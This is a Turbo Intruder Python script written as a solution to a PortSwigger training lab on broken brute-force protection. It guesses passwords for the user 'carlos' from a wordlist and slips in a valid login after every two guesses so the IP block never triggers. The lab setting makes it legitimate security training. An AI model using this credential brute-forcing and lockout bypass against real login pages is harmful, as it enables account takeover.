# This is the turbo intruder python script
# for solving the lab of portswigger: Broken brute-force protection, IP block

# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    pass_wordlist = open('/home/anon05/WebAppPentest/auth/pass.txt').readlines()
    for count in range(len(pass_wordlist)+(100//3)):
        if count % 3 == 0:
            engine.queue(target.req, ['wiener','peter'])
        else:
            engine.queue(target.req, ['carlos',pass_wordlist[count-(count//3)].rstrip()])

def handleResponse(req, interesting):    
    if req.status != 200 and 'carlos' in req.response:
        table.add(req)
